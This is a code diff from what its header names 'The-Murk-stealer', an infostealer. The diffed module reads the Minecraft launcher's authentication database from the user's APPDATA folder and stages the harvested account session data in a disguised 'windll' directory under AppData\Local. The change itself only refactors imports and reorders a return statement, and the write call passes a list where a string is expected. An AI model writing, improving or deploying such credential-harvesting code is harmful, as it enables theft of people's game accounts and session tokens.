@@ -10,15 +10,15 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import json
-import os
+from json import loads
+from os import getenv,makedirs,sep,environ
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
 
 def Minecraft(data):
     try:
-        auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]# path to minecraft
+        auth_db = loads(open(getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]# path to minecraft
         logs = []
         for x in auth_db:
             try:
@@ -36,9 +36,9 @@ def Minecraft(data):
                         ]
                 }
                 logs.append(log)
-                pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+                pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
                 try:
-                    os.makedirs(rf'{pathf}\windll\Games\Minecraft')
+                    makedirs(rf'{pathf}\windll\Games\Minecraft')
                     with open(rf'{pathf}\windll\Games\Minecraft\session.txt',"w") as file:#wrire logs
                         file.write(logs)
                     data.append("\n∟🎮Minecraft")
@@ -48,5 +48,5 @@ def Minecraft(data):
             except:
                 pass
     except Exception as e:
-        return data
         print(e)
+        return data
